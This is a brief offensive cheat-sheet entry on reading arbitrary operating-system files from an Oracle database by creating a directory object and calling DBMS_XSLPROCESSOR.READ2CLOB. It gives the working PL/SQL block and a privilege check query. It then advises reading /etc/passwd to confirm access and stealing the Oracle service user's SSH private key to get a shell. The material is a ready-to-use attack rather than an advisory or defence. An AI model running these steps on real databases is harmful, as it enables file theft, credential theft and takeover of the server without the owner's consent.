# Oracle DB Arbitrary File Read (DBMS_XSLPROCESSOR)

Any Oracle account with `CREATE ANY DIRECTORY` (or `CREATE DIRECTORY` on its own schema) can read arbitrary OS files the DB process can see, no `UTL_FILE` grant needed:

```sql
BEGIN
  EXECUTE IMMEDIATE 'CREATE OR REPLACE DIRECTORY dir AS ''/path/to/read''';
  DBMS_OUTPUT.PUT_LINE(DBMS_XSLPROCESSOR.READ2CLOB('DIR','filename'));
END;
```
Check `SELECT * FROM USER_SYS_PRIVS;` for the directory-create right first. Target `/etc/passwd` to confirm, then pivot to the Oracle OS user's own `~/.ssh/id_rsa` for a shell — Oracle service accounts are frequently SSH-reachable with their own home directory.
